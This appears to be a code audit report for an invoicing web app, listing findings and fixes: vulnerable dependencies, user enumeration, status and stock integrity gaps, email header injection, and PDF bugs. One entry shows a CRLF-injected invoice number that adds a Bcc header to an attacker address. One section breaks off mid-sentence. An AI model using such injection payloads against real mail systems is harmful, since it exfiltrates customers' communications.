### DEP-001 — Unused dependency `@auth/prisma-adapter` imports critical-severity vulnerable `@auth/core`
- **Severity**: High (dependency carries Critical CVEs, but exposure is likely zero since the package appears unused)
- **Category**: Dependency risk / attack surface
- **Location**: `package.json` (`"@auth/prisma-adapter": "^2.11.2"`)
- **Problem**: The app uses NextAuth v4 (`next-auth@^4.24.14`) with `CredentialsProvider` + JWT sessions (per `src/lib/auth.ts` / CLAUDE.md). `@auth/prisma-adapter` is the Auth.js v5 (`@auth/*`) database-session adapter — grepped `src/` for `@auth/prisma-adapter` and `PrismaAdapter`, zero matches. This dependency pulls in `@auth/core <=0.41.2`, which has 3 CRITICAL GitHub advisories: email-normalizer homoglyph `@` bypass, `getToken()` uncaught exception on malformed Bearer header, and OAuth state/nonce/PKCE cookies not bound to the originating provider.
- **Why it matters**: An unused package still ships in `node_modules`, still gets bundled into serverless function cold-start paths if anything transitively imports it, and is dead weight that could get accidentally wired up later by a developer who assumes it's there for a reason. The critical CVEs themselves (OAuth/email-normalization related) are almost certainly **not reachable** since the app doesn't use Auth.js v5's OAuth flows or database adapter — but this needs explicit confirmation, not assumption.
- **Verification method**: Re-grepped the entire repo (not just `src/`) for `@auth/prisma-adapter`/`PrismaAdapter` — the only matches outside `node_modules` were `package.json`/`package-lock.json` themselves and this audit's own doc files. Zero actual code references anywhere (routes, lib, scripts, `prisma/seed.ts`).
- **Expected**: Only dependencies actually imported/used should be in `package.json`.
- **Actual (before fix)**: Declared, unused, contributing to the critical CVE count via its `@auth/core@<=0.41.2` transitive dependency.
- **Fix applied (2026-08-18)**: `npm uninstall @auth/prisma-adapter`. This alone did not fully clear the critical CVEs — `next-auth@4.24.14` itself declares `@auth/core@0.34.3` as an **optional peer dependency** (pinned to that exact vulnerable version), which npm auto-installs regardless of whether the adapter package is present. Added `"overrides": { "@auth/core": "0.41.3" }` to `package.json` (the first patched release) to force that resolution — safe because the package is provably unused by any of our code (confirmed by grep) and unused-but-present code can't execute. Verified via `npm ls @auth/core` that it now resolves to `0.41.3`.
- **Regression risk**: None — removing/repinning a version of a package our code never imports cannot change runtime behavior. `tsc --noEmit` and `npm run build` both confirmed clean after this change (see DEP-002/DEP-003 verification below, run in the same batch).
- **Status**: Fixed.

### DEP-002 — `nodemailer@^7.0.13` has 6 High-severity advisories, some header/envelope-injection-shaped
- **Severity**: High
- **Category**: Dependency / injection risk
- **Location**: `package.json` (`nodemailer`), used in `src/app/api/send-invoice/route.ts`, `src/app/api/send-rate-list/route.ts`, `src/app/api/auth/forgot-password/route.ts` (send paths not yet individually re-read this session)
- **Problem**: Advisories include SMTP command injection via unsanitized `envelope.size`, CRLF injection via transport name (EHLO/HELO), CRLF injection in `List-*` header comments, `jsonTransport` bypassing `disableFileAccess`/`disableUrlAccess`, improper TLS cert validation on OAuth2 token fetch, and a message-level `raw` option bypass enabling arbitrary file read / SSRF.
- **Why it matters**: If any user-controlled string (customer name/email, invoice notes, rate-list recipient address typed at share-time) flows into a mail header or the `envelope` object without the vulnerable versions' broken sanitization, an attacker could inject SMTP commands or extra headers.
- **Verification method (done in Phase 2)**: Read `send-invoice/route.ts`, `send-rate-list/route.ts`, `forgot-password/route.ts` line by line. None use `envelope.size`, a custom `raw` message, or `jsonTransport` — all three call the plain `sendMail({to, from, subject, html, attachments})` shape, which doesn't touch those specific vulnerable code paths. Did find a related-but-distinct real bug via this same review — see **API-004** (subject-header injection from unsanitized client input) — now fixed at the application level regardless of the dependency version.
- **Fix applied (2026-08-18)**: Upgraded `nodemailer` `7.0.13` → `9.0.5` (the patched major version) despite the breaking-change label. Verified safe: (1) `node -e` sanity check confirmed `createTransport({service, auth})` and `.sendMail` still exist with the same call shape used everywhere in this codebase; (2) `tsc --noEmit` clean (no `@types/nodemailer` mismatch surfaced); (3) `npm run build` completed successfully with no errors. `next-auth@4.24.15` lists `nodemailer@^7.0.7` as an *optional* peer (only exercised if its unused `EmailProvider` were configured, which it isn't) — npm emits a peer-mismatch warning, not an error, and it's inert for this app's actual code paths (`CredentialsProvider` only).
- **Regression risk**: Low, given the above verification, but this was a major version bump — recommend a manual smoke test of the actual email-sending flows (forgot-password, send-invoice, send-rate-list) against a real Gmail account once environment access allows it, since `tsc`/build can't prove the SMTP wire behavior itself is unchanged.
- **Status**: Fixed (pending a live-email smoke test as a follow-up, noted above).

### AUTH-001 — `/api/auth/find-email` discloses full names of every user (staff/admin) to unauthenticated callers, enumerable by substring
- **Severity**: Medium
- **Category**: Authentication / information disclosure
- **Location**: `src/app/api/auth/find-email/route.ts`
- **Problem**: The route is public (in `middleware.ts`'s `PUBLIC_API_PREFIXES` under `/api/auth/`), rate-limited to 10 req/IP/15min, and takes a `name` substring, returning up to 5 `{name, maskedEmail}` results via a case-insensitive Prisma `contains` match across **all** `User` rows (no role filter — admin and manager names are returned too). An attacker can enumerate the entire staff directory by iterating short substrings (a-z, then two-letter combos, etc.) within the rate limit, building a full list of employee names + masked emails (first 2 chars + domain visible) for this business. This is a legitimate account-recovery feature ("forgot my email, remember my name") but has no requirement that the caller already know anything about the account beyond a guessed name fragment.
- **Why it matters**: Employee directory enumeration is a common precursor to targeted phishing/social-engineering (attacker now has real names + partial emails + knows exactly who has an account, which combined with typical corporate email formats (firstname.lastname@domain) often fully reconstructs the real address). Also confirms which of the two guessed usernames from `admin@sciencehub.com` seed data etc. are real accounts.
- **Failure scenario**: Anonymous attacker issues `POST /api/auth/find-email {name:"a"}`, `{name:"e"}`, etc. (26 requests, under the 10/15min-per-IP limit if paced, or trivially defeated by rotating IPs since the limit is in-memory per-instance anyway per `rateLimit.ts`'s own documented caveat) and reconstructs the whole `User.name` + masked-email table within a day.
- **Recommended fix**: Consider requiring an exact (or near-exact, e.g. full name) match rather than `contains`, and/or lowering `take` further, and/or requiring the name to match closely (e.g. Levenshtein-bounded) rather than a raw substring — the current `contains` is the main enumeration lever. Alternatively/additionally, add a stricter per-IP daily cap. This is a UX-vs-security tradeoff the product owner should weigh in on rather than a pure bug — flagging for a decision, not auto-fixing.
- **Regression risk**: Low — this is an isolated, self-contained route; tightening the match logic doesn't affect any other feature.
- **Fix applied (2026-08-18)**: Changed the Prisma `where` clause in `src/app/api/auth/find-email/route.ts` from `{ contains: name.trim(), mode: "insensitive" }` to `{ equals: name.trim(), mode: "insensitive" }`. Verified `src/app/find-email/page.tsx` is a submit-on-click form (not live-typeahead) whose own copy already says "Enter your name as registered in the system" — exact match matches the UX contract the page already advertises, so no client-side UX change was needed. `tsc --noEmit` and `eslint` both clean on the touched file.
- **Status**: Fixed — substring enumeration no longer possible; only a caller who already knows their own exact registered name gets a result.

### AUTH-002 — `admin/users/[id]` PUT still uses raw `getServerSession` instead of `apiAuth.ts` guards for the self-edit path (informational-leaning, not exploitable)
- **Severity**: Low
- **Category**: Code consistency / maintainability (not a live vulnerability — logic is correct as written)
- **Location**: `src/app/api/admin/users/[id]/route.ts` (PUT handler), `src/app/api/admin/profile/route.ts` (GET/PUT)
- **Problem**: Unlike every other admin route (which calls `requireAdmin()`/`requireWriteAccess()` from `apiAuth.ts`), these two handlers call `getServerSession(authOptions)` directly and hand-roll the `isAdmin`/`isSelf` authorization branching inline. The logic is correct (verified: non-admin can only edit self; only admin can change `role`; role enum validated by `validateUserInput`; email uniqueness re-checked; password change requires `currentPassword` + `bcrypt.compare` for self-edits, skipped only when an admin edits someone else; `tokenVersion` incremented on any password change, correctly invalidating other sessions).
- **Why it matters**: Not exploitable today, but every other route in the app uses the shared `apiAuth.ts` guards specifically so a new route can't forget a check — hand-rolling this one path means a future edit to this file could silently drop a check without the "did you forget requireX()" mental model the rest of the codebase relies on.
- **Recommended fix**: Optional refactor — introduce something like `requireSelfOrAdmin(id)` in `apiAuth.ts` if this pattern recurs elsewhere; not urgent.
- **Regression risk**: N/A originally (informational) — became relevant once a fix was attempted (see below).
- **Fix applied (2026-08-18), partial by design**: `src/app/api/admin/users/[id]/route.ts`'s PUT handler now calls the shared `requireSession()` from `apiAuth.ts` instead of raw `getServerSession(authOptions)`, keeping the same `isAdmin`/`isSelf` branching logic on top — this route had no special fallback behavior, so the swap is behavior-neutral (`tsc --noEmit` + `eslint` clean).
  `src/app/api/admin/profile/route.ts` was **deliberately left unchanged** after investigation: its `resolveSessionUser()` helper has an intentional, documented fallback (per root `CLAUDE.md`: "resolveSessionUser fallback for old JWTs") that looks the user up by `session.user.email` when `session.user.id` is absent — this covers sessions issued before `token.id` existed in the JWT shape. `requireSession()` in `apiAuth.ts` rejects with 401 the moment `session.user.id` is missing, so swapping it in here would have silently removed that fallback and logged out any still-valid old-shaped session instead of resolving it by email. Applying the "use the shared guard" fix uniformly would have introduced a real regression — correctly identified and reverted before it shipped.
- **Regression risk**: None for the users/[id] change (verified type-check + lint clean, logic identical). The profile route was correctly left alone specifically to avoid a regression.
- **Status**: Fixed (users/[id] route) / Won't Fix by design (profile route — fixing would regress the documented old-JWT fallback).

### API-001 — `PUT /api/invoices/[id]` lets any write-access caller set an arbitrary, unvalidated `status` string decoupled from `paidAmount`, which silently hides real dues from Outstanding/Overdue reports
- **Severity**: High
- **Category**: Business logic / data integrity
- **Location**: `src/app/api/invoices/[id]/route.ts`, lines ~61-70 (the `if (!items) { ... data.status = status ... }` shortcut branch)
- **Problem**: When a `PUT` body omits `items` (a "notes/status-only update" branch, per the code's own comment "from payment flow"), the handler does `if (status !== undefined) data.status = status;` with **zero validation** — no enum check against `unpaid`/`partial`/`paid`, and no server-side recomputation from `paidAmount` (which the full-items branch and both `payment` routes correctly do). Every other place in the codebase that sets `Invoice.status` derives it itself from `paidAmount` vs `total` — this is the one path that doesn't.
- **Why it matters**: `src/app/api/reports/route.ts` (and `purchase-reports` for bills) filters Outstanding/Overdue aggregates with `where: { status: { in: ["unpaid", "partial"] } }` — confirmed by reading the route. If `status` is set to `"paid"` (or any string outside that set) without `paidAmount` actually reaching `total`, the invoice vanishes from Outstanding/Overdue totals and counts while the customer still genuinely owes money. This is reachable by any authenticated write-access user (staff or admin — not just a compromised account) simply by calling `PUT /api/invoices/{id}` with `{ "status": "paid" }` and no `items` key; no UI code currently constructs such a call (grepped the invoice edit/detail/list pages — none send a status-only PUT), so this is unused-but-live API surface, not something a normal user would trigger by accident through the UI. It also means the invoice's own `existing.status === "paid"` guard (which blocks further edits to "a fully paid invoice") could be flipped on without ever recording a payment, permanently locking the invoice out of edits.
- **Failure scenario**: Staff member (accidentally via a stray API client, or a future feature that reuses this endpoint) sends `PUT /api/invoices/abc123 {"status":"paid"}`. Invoice keeps `paidAmount: 0`, `total: 5000`, but `status` becomes `"paid"`. The ₹5,000 due no longer appears in Outstanding Reports, Overdue counts, or the dashboard's outstanding-balance KPI, even though `balanceDue` (the generated column) still correctly shows ₹5,000 on the invoice's own detail page — the two views of the same invoice now disagree, and the discrepancy has no audit trail (no `Payment` row was created, unlike the legitimate payment-recording path which logs an activity entry).
- **Recommended fix**: Remove trust in the client-supplied `status` entirely on this branch — either (a) drop the ability to set `status` via this endpoint at all (recompute it from `paidAmount`/`total` the same way the full-items branch does, ignoring any client-sent `status`), or (b) if some legitimate caller needs a manual status override (none currently exists), validate it against the enum and require it to be internally consistent with `paidAmount` before accepting it.
- **Regression risk**: Low — grepped every current frontend call site to `PUT /api/invoices/[id]`; none send `status` without also sending `items`, so removing client trust in this one field doesn't change any existing UI flow. Should still run the invoice edit/payment flows manually after the fix to confirm.
- **Fix applied (2026-08-18)**: `src/app/api/invoices/[id]/route.ts` — the notes-only branch no longer accepts/writes `status` at all (option (a): no legitimate caller needed it, confirmed by grep). Removed the now-unused `status` destructure from the request body too. `tsc --noEmit` + `eslint` clean.
- **Status**: Fixed.

### API-002 — `PUT /api/products/[id]` lets `stock` be changed directly, bypassing the audited `batchAdjustStock()`/ledger path the app explicitly built to prevent exactly this
- **Severity**: High
- **Category**: Data integrity / audit trail
- **Location**: `src/app/api/products/[id]/route.ts` (PUT handler, `numericFields` array includes `["stock", stock, 0, Infinity, true]`, written straight to `data.stock`); consumed by `src/app/(dashboard)/products/[id]/edit/page.tsx` (line 103: `stock: parseInt(form.stock)` sent on every save, and `ProductFormFields` renders it as an editable "Current Stock" field, per `stockLabel="Current Stock"`).
- **Problem**: `src/lib/stockMovement.ts`'s `batchAdjustStock()` exists specifically so every stock change is recorded in the `StockMovement` ledger — root `CLAUDE.md` states this as a hard rule ("Do not mutate stock without going through `batchAdjustStock()`"), and `POST /api/products/[id]/adjust-stock` (`src/app/api/products/[id]/adjust-stock/route.ts`) was built for exactly this gap — its own code comment says so verbatim: *"the ledger already reserved a 'manual' movement type for exactly this, but no screen previously used it, so fixing a discrepancy had no recorded, traceable route (someone would otherwise have to edit the Product row directly, leaving no ledger entry explaining why the number changed)."* Despite that fix shipping, the plain product-edit form/route was never updated to stop allowing the exact "edit the Product row directly" path the comment describes — `stock` is still a plain numeric field in the generic PUT, written with no ledger entry, no reason required, and no `StockMovement` row created.
- **Why it matters**: Every other stock-affecting action in the app (sales, purchases, returns, bin restore, and now manual adjustment) leaves a `StockMovement` row with a running `balanceAfter` — the product detail page's own "last 15 stock movements" panel and the stock-ledger report both rely on this being complete. A stock change made via the plain edit form leaves a gap: the displayed stock jumps with no corresponding ledger entry to explain it, exactly the discrepancy `adjust-stock` was written to eliminate — except it doesn't, because this second door was left open.
- **Failure scenario**: Staff opens a product's Edit page to fix a typo in the price, and while there also changes "Current Stock" from 40 to 25 (maybe misreading it as a field they're supposed to keep in sync manually). Save succeeds with no reason prompt. `Product.stock` is now 25, but the ledger's last entry still says "balance after: 40" — anyone reconciling the ledger against the live stock count later finds an unexplained 15-unit gap with no `StockMovement` row, no activity-log detail beyond a generic "Updated product" line, and no way to know why.
- **Recommended fix**: Two viable options — (a) make the product edit form's stock field **read-only** (with a link/button to the existing "Adjust Stock" action for actually changing it), and drop `stock` from the PUT route's accepted fields entirely; or (b) if inline editing is kept for convenience, route the edit route's stock change through `batchAdjustStock()` inside the same transaction (delta = new − old) with an auto-generated note, so the ledger stays authoritative either way. Option (a) is more consistent with the rest of the app's "one audited door per side effect" pattern and matches what the `adjust-stock` feature's own commit intended; option (b) preserves current one-form-does-everything UX at the cost of a required-reason prompt disappearing. **This is a product decision, not purely a bug fix** — flagging for the same kind of call as AUTH-001 before changing UI behavior.
- **Regression risk**: Medium — removing the field from the edit form changes an existing, currently-used UI flow (unlike AUTH-001/002 fixes, which touched dead/never-invoked code paths). Needs a decision before implementing.
- **User decision (2026-08-18)**: Option (a) — make edit-form stock read-only, point to "Adjust Stock".
- **Fix applied (2026-08-18)**:
  - `src/app/api/products/[id]/route.ts` — removed `stock` from the accepted/updatable fields in the PUT handler entirely (server no longer trusts a client-supplied `stock` value on this route at all, closing the gap even for a direct API call bypassing the UI); removed the now-unused `stock` destructure.
  - `src/components/products/ProductFormFields.tsx` — added a `stockReadOnly` prop: when set, the stock `Input` is `disabled`+`readOnly`, its `required` asterisk drops, and a hint reads *"Use 'Adjust Stock' on the product page to change this — it keeps a reason and history."*
  - `src/app/(dashboard)/products/[id]/edit/page.tsx` — passes `stockReadOnly` to `ProductFormFields`, and no longer sends `stock` in the PUT body. The New Product page (`products/new/page.tsx`) is unaffected — it doesn't set `stockReadOnly`, so opening stock stays freely editable at creation time (there's no prior ledger state to violate for a brand-new product).
  - `tsc --noEmit` + `eslint` clean on all four touched files.
- **Status**: Fixed.

### API-003 — `PUT /api/purchase-bills/[id]` had the same status-trust gap as API-001, but narrower (only "cancelled" is a legitimate direct value)
- **Severity**: High
- **Category**: Business logic / data integrity
- **Location**: `src/app/api/purchase-bills/[id]/route.ts`, the `effectiveStatus` derivation (~line 208 before fix)
- **Problem**: When a `PUT` body didn't change `items`/`discount` (`totalChanged === false`), the old code did `effectiveStatus = status` — trusting the client's raw `status` string outright, with only a narrow guard against setting `"paid"` when `paidAmount` doesn't cover `total`. No guard existed against setting `"unpaid"`/`"partial"` (or any arbitrary string) directly, and the code's own comment justified trusting `status` verbatim because "the one status a user DOES set directly is 'cancelled'" — but the code didn't actually enforce that it could *only* be `"cancelled"`.
- **Why it matters**: Same report-filter exposure as API-001 (`purchase-reports`/`reports` filter on `PurchaseBill.status`), but bidirectional here: a caller could force a fully-paid bill's status back to `"unpaid"`/`"partial"` (falsely reappearing in Outstanding/Overdue and vendor-payment-due views despite being paid) just as easily as forcing an unpaid one to `"paid"` (falsely disappearing from those same views, hiding real vendor dues) — because unlike the invoice route, this one had no items-based branch forcing a false "paid" is the *only* thing partially guarded; nothing guarded a false "unpaid"/"partial"/arbitrary string.
- **Verification method**: Grepped every frontend call site to `PUT /api/purchase-bills/{id}` for a `status` key — found exactly one (`purchases/bills/[id]/page.tsx` line 216, the Cancel Bill button, `{ status: "cancelled" }`). No "Uncancel" UI currently exists despite the code comment describing it as a supported flow.
- **Fix applied (2026-08-18)**: `status` is now only trusted verbatim when it's the literal string `"cancelled"`. Any other explicit `status` value sent by a caller (with no `items`/`discount` change) is now **recomputed from `paidAmount` vs `total`** instead of trusted as-is — this also correctly implements the "un-cancel" case the original comment described (moving off `"cancelled"` now always lands on the paidAmount-derived status rather than trusting whatever string arrives), so no capability was lost, only the unvalidated-string gap. `tsc --noEmit` + `eslint` clean.
- **Regression risk**: Low — the one real caller (Cancel Bill) sends exactly `"cancelled"`, unaffected. No un-cancel UI exists yet to regress.
- **Status**: Fixed.

### API-004 — `send-invoice`/`send-rate-list` built the email `subject` header from an un-sanitized, client-supplied string, allowing SMTP header injection
- **Severity**: High
- **Category**: Injection (email header injection / SMTP command injection)
- **Location**: `src/app/api/send-invoice/route.ts` (`subject: \`Invoice ${invoiceNumber} — ${biz.name}\``), `src/app/api/send-rate-list/route.ts` (`subject: \`${title} — ${biz.name}\``)
- **Problem**: Both routes take `invoiceNumber`/`title` directly from client-submitted `FormData` with only a presence check (`if (!invoiceNumber) ...`) — no length cap, no character restriction. That raw string is interpolated straight into the `subject` field passed to `nodemailer.sendMail()`. Unlike the `to` field (regex-validated, no whitespace allowed) and the HTML body (run through `escapeHtml()`), nothing stripped embedded `\r\n` from these two fields before they reached a mail header. This is exactly the header-injection shape called out in the `nodemailer` advisories already flagged as DEP-002 in this report (CRLF injection allowing arbitrary message header injection) — regardless of whether the installed `nodemailer` version's own internals happen to filter it, the application itself should never pass unsanitized user input into a header field.
- **Why it matters**: Any authenticated write-access user (staff or admin — not just a compromised/malicious account) could submit a crafted `invoiceNumber`/`title` containing `\r\n` to inject additional SMTP headers (e.g. a `Bcc:` line) into an email sent from the business's own configured Gmail account to a recipient of their choosing. This could be used to quietly exfiltrate copies of outgoing customer communications, or to manipulate `Reply-To` for a phishing attempt that rides on the business's own legitimate sending identity — a low-privilege user turning a legitimate feature into an abuse vector against the business's own customers/reputation.
- **Failure scenario**: A staff user opens browser devtools (or a scripted request) and calls `POST /api/send-invoice` with `invoiceNumber: "SH-1\r\nBcc: attacker@evil.com"`. Depending on how the transport layer handles it, this could append an extra `Bcc` header to the outgoing email, silently copying it to the attacker while the recipient sees nothing unusual.
- **Recommended fix**: Reject any `invoiceNumber`/`title` containing `\r`/`\n`, and cap its length, before it's used anywhere (subject or filename) — mirrors the strict validation already applied to `to`.
- **Fix applied (2026-08-18)**: Both routes now reject the request with 400 if `invoiceNumber`/`title` contains `\r` or `\n`, or exceeds 100/200 characters respectively. `tsc --noEmit` + `eslint` clean.
- **Regression risk**: Low — a legitimate invoice number or rate-list title never contains a newline; the length caps (100/200 chars) are well above any real value.
- **Status**: Fixed.

### SEC-004 — `isPurchaseBillBlobUrl()`/`isLogoBlobUrl()` only checked the URL's shape (any `*.public.blob.vercel-storage.com` host), not that it belonged to this app's own Vercel Blob store
- **Severity**: High
- **Category**: Trust boundary / storage allowlist bypass
- **Location**: `src/lib/blobStorage.ts`
- **Problem**: Both allowlist helpers checked `hostname.endsWith(".public.blob.vercel-storage.com")` — but that domain is shared across *every* Vercel Blob store on the platform, not unique to this app. Anyone with their own (free) Vercel account can get a hostname ending in that exact suffix for their own store. The check never verified the hostname matched *this app's* specific store.
- **Why it matters**: `attachmentUrl` on purchase-bill create/edit (any staff/admin write-access user, not just admin) and `logoUrl` on the settings PUT (admin) both trust these helpers as the sole gate before persisting a client-submitted URL. ### BIZ-003 — Recording a payment (or return) on the same calendar day an invoice/bill was created almost always failed with "date cannot be before" — found via live testing, not code reading
- **Severity**: High (near-universal real-world trigger rate — this is arguably the single most damaging functional bug found in this audit)
- **Category**: Business logic / date handling
- **Location**: `src/app/api/invoices/[id]/payment/route.ts`, `src/app/api/invoices/[id]/payment/[paymentId]/route.ts`, `src/app/api/purchase-bills/[id]/payment/route.ts`, `src/app/api/invoices/[id]/returns/route.ts` — all four had `if (paymentDate < invoiceCheck.date)` / `if (returnDate < billCheck.billDate)` style comparisons.
- **How it was found**: Live click-through testing (started the dev server, logged in, created a real invoice, tried to record a payment on it the same day) — this was a genuine runtime bug that static code reading in Phase 2 missed, because the code *looks* correct in isolation (a plain `<` comparison between two `Date` objects) — the bug only appears when you actually run it and compare a bare date input against a full timestamp column.
- **Problem**: The client sends a bare `"YYYY-MM-DD"` string (from an `<input type="date">`, always defaulting to "today"). The server parses it with `new Date(dateStr)`, which yields **midnight UTC of that calendar date**. The invoice/bill's own `date`/`billDate` column, however, stores the **exact creation timestamp** (e.g. `2026-08-18T09:51:38.476Z` — well after midnight). Comparing `new Date("2026-08-18") < <2026-08-18T09:51:38>` is `true` for any invoice created any time after midnight UTC that day — which is essentially always, so recording a payment "today" on an invoice created "today" was rejected as if the payment predated the invoice, even though both display as the identical calendar date to the user. The client-side validation (`paymentForm.date < invoice.date.slice(0, 10)`) already correctly truncated both sides to date-only before comparing, so the bug was invisible in the UI's own pre-submit check — it only surfaced as a server-side 400 after the request was already sent, which is exactly what live-clicking the flow caught and static route-reading (Phase 2) did not.
- **Failure scenario**: Any real business, any day: create an invoice in the morning, customer pays cash on the spot, staff clicks "Record Payment" with today's date pre-filled → **"Failed: Payment date cannot be before the invoice date."** No workaround exists in the UI (the date picker's `max` is today, so there's no valid date left to pick if "today" itself is rejected) — the only way to record the payment at all was to wait until the next calendar day, or edit the invoice's own date, neither of which a normal user would think to do. Same failure mode for purchase-bill payments and for recording a same-day return/credit note.
- **Verification method**: Reproduced live (screenshot captured of the exact error), then fixed and re-verified live by re-running the same payment against the same real invoice — confirmed via a direct database query afterward that the payment persisted correctly (`status: "partial"`, `paidAmount: 50`, one `Payment` row).
- **Fix applied (2026-08-18)**: Added `toIstDateStr(date: Date)` to `src/lib/validation.ts` (converts a full timestamp to its own IST calendar-date string, mirroring the existing `isFutureIstDate` helper's exact reasoning) and changed all four comparisons to compare the submitted date **string** against `toIstDateStr(parentDate)` instead of comparing raw `Date` objects. `tsc --noEmit` + `eslint` clean on all five touched files.
- **Regression risk**: Low — this only loosens an overly-strict same-day check to match what the UI already intended and what the client-side validation already correctly implements; genuinely-backdated payments (before the invoice's actual calendar date) are still correctly rejected.
- **Status**: Fixed and live-verified.

### PDF-001 — Multi-page invoice PDFs duplicated/clipped a line item across the page break, and showed a doubled/wrong page-number stamp on every page
- **Severity**: High
- **Category**: PDF generation correctness (customer-facing document defect)
- **Location**: `src/lib/generateInvoicePdf.ts` — the page-split-point computation (Pass 1) and the `stampPageMarker()` erasure logic
- **How it was found**: Live-generated and visually inspected actual PDF output (not just checked that a blob was produced) for an 18-line-item real invoice — the exact threshold where this app's own `ITEM_COUNT_FOOTER_SPLIT = 18` forced-page-break rule first engages. Two distinct, confirmed-via-pixel-inspection defects:
  1. **Item duplication/clipping across the page break**: item 18 (and, after the first fix attempt, item 17) rendered as a visibly truncated sliver at the very bottom of page 1, then rendered again in full at the top of page 2 — the same table row appearing twice, once cut off.
  2. **Doubled page-number stamp**: every page showed two stacked lines — the React-rendered placeholder text baked into the DOM (`<span id="invoice-page-marker">Page No. 1 of 1</span>`, per `sales/invoices/[id]/page.tsx`) sitting incompletely erased right next to the correctly-computed dynamic stamp, e.g. "Page No. 1 of 1" AND "Page No. 1 of 2" both visible on the same page.
- **Root causes** (isolated by adding temporary diagnostic logging to the live-running generator and inspecting the actual computed values, not by inference alone):
  1. `html2canvas`'s rendered raster can drift a few px from the pre-capture `getBoundingClientRect()` measurements the split-point math is built on (the code already knew this risk existed — that's exactly why `FOOTER_MARGIN_PX` exists — but that cushion was only applied to the footer-fit decision, never to the row-boundary split itself, which is a much smaller target: ~46px-tall rows on this invoice, easily within drift range).
  2. The `forcedItemSplitPoint` cap (used only for "keep the first N items on page 1") was applied with a `start < forcedItemSplitPoint` guard instead of `pNum === 0` — fine on its own, but once fix (1)'s safety margin could legitimately end page 1 *before* reaching `forcedItemSplitPoint`, this guard incorrectly re-applied the same cap to page 2 as well, producing a near-empty extra page holding only the couple of rows the margin had deliberately deferred.
  3. `stampPageMarker()`'s erase-rectangle was sized to the exact live-DOM-measured dimensions of the marker `<span>` (`pmWidthPx`/`pmHeightPx`) — too tight to reliably cover the same element's differently-rendered footprint inside html2canvas's offscreen clone (font-loading/line-height differences between the live page and the clone are a known html2canvas limitation), leaving the original baked-in text only partially erased.
- **Fix applied (2026-08-18)**: (1) Added a `ROW_SPLIT_SAFETY_PX` margin (20×`SCALE`) subtracted from the ideal split point before searching for a safe row boundary, so the chosen split always lands with deliberate slack before a row's true edge rather than possibly landing a few px into it. (2) Changed the forced-item-cap guard from `start < forcedItemSplitPoint` to `pNum === 0`, matching the rule's actual intent ("first page only") and eliminating the degenerate extra page fix (1) would otherwise have introduced. (3) Widened the page-marker erase rectangle with generous padding (40×`SCALE` horizontal, 20×`SCALE` vertical) instead of the exact measured box, reliably covering the baked-in placeholder text regardless of html2canvas's rendering-metric differences.
- **Verification method**: Iteratively re-generated and re-downloaded the real PDF after each change (against the actual dev server, not a mock), inspecting the rendered pages directly. When the visual result was still ambiguous, added temporary instrumentation to log the exact computed `pageSplits` array and `stampPageMarker()` call arguments, and separately exported the raw per-page canvas slices as standalone JPEGs (bypassing any PDF-viewer rendering ambiguity) to confirm pixel-level correctness before declaring it fixed. All temporary debug logging was removed before finalizing — confirmed via `grep` that no `PDF_DEBUG`/console instrumentation remains. Final state re-verified once more after cleanup (byte-identical output to the last debug run, confirming the cleanup itself introduced no behavior change), plus a regression check against the earlier single-page invoice (byte count nearly identical to its pre-fix render, no visual change).
- **Regression risk**: Low — verified both the specific failing case (18-item invoice, exactly at the forced-split threshold) and a simple single-page invoice (no split at all) render correctly; `tsc --noEmit` and `eslint` both clean.
- **Status**: Fixed and visually verified via direct pixel inspection, not just absence of thrown errors.
- **Follow-up (2026-08-18, same day, user-reported)**: The user spotted a *further* artifact this initial fix had introduced — a visible broken/offset line through the footer bar's own bottom border, in the exact area the marker-erasure rectangle covered. Root cause: the widened erasure rectangle (40×`SCALE` horizontal, 20×`SCALE` vertical padding) intruded *upward* into the tfoot's own gray/bordered box — the natural gap between the box's bottom edge and the marker text is only ~9px, far smaller than the 20×`SCALE`=40px of padding — so part of the box's background/border got white-washed. Fixing this by clamping the erasure to never go above the box's analytically-measured bottom edge immediately reintroduced the *original* doubled-text bug on multi-page invoices, because (as later confirmed by rendering the raw canvas with color-coded boundary markers) the box's true rendered bottom edge in html2canvas's offscreen clone doesn't reliably match the live-DOM-measured offset this analytical approach depended on — the two failure modes couldn't both be avoided with a fixed geometric formula. Resolved by replacing the geometric estimate with **direct pixel sampling**: at a canvas column clear of the (centered) "Thank you…" text, scan downward from the footer's top and find the actual last non-white pixel — that is the box's *true* rendered bottom edge in this specific capture, regardless of any measurement/render mismatch — and erase everything below that point (always safe, since that entire region is plain white background outside the table by design) through the end of the pasted footer block. Verified clean across all four page/copy combinations of the 18-item invoice and the single-page invoice (fresh screenshots of each, zoomed into the footer region) before removing the (more extensive, this round) temporary debugging code — including a raw-canvas boundary-marker overlay and an in-place pixel-marker overlay on the composited output, both used to visually confirm the hypothesis before writing the fix rather than guessing again. Final output re-verified byte-identical to the last debug-instrumented run after cleanup.
- **Status (updated)**: Fixed and re-verified across both known edge cases (single-page, and multi-page × both copy labels) after the follow-up fix.
